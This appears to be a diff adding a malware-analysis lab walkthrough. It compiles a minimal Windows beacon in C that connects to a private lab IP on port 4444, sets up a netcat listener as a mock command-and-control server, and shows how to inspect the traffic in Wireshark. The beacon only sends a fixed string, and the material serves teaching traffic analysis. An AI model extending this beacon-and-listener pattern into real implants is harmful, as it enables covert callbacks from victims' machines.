@@ -1,0 +1,71 @@
+# PART A: CREATING SAMPLE.EXE (UBUNTU)
+
+# Step 1: Install Packages
+sudo apt update
+sudo apt install mingw-w64 wine -y
+
+# Step 2: Create Directory
+mkdir malware_lab
+cd malware_lab
+
+# Step 3: Create Source Code
+vi sample.c
+
+# --- SOURCE CODE START ---
+#include <winsock2.h>
+#include <windows.h>
+int main() {
+    WSADATA wsa;
+    SOCKET sock;
+    struct sockaddr_in server;
+    char message[] = "beacon:system_online";
+    WSAStartup(MAKEWORD(2,2), &wsa);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_addr.s_addr = inet_addr("192.168.56.101");
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444);
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+    send(sock, message, sizeof(message), 0);
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+# --- SOURCE CODE END ---
+
+# Step 4: Compile Executable
+x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32
+
+# Step 5: Verify
+file sample.exe
+
+
+# PART B: PREPARING C2 SERVER (METASPLOITABLE 2)
+
+# Step 6: Check IP
+ifconfig
+
+# Step 7: Start Listener
+nc -lvnp 4444
+
+
+# PART C: CAPTURING TRAFFIC (KALI LINUX)
+
+# Step 8: Start Wireshark
+wireshark
+
+
+# PART D: EXECUTING MALWARE (UBUNTU)
+
+# Step 10: Run with Wine
+wine sample.exe
+
+
+# PART E: WIRESHARK ANALYSIS (KALI LINUX)
+
+# Step 12: Filters
+tcp
+ip.addr == 192.168.56.101
+tcp.port == 4444
+
+# Step 13: Inspect Payload
+# Right-click packet -> Follow -> TCP Stream
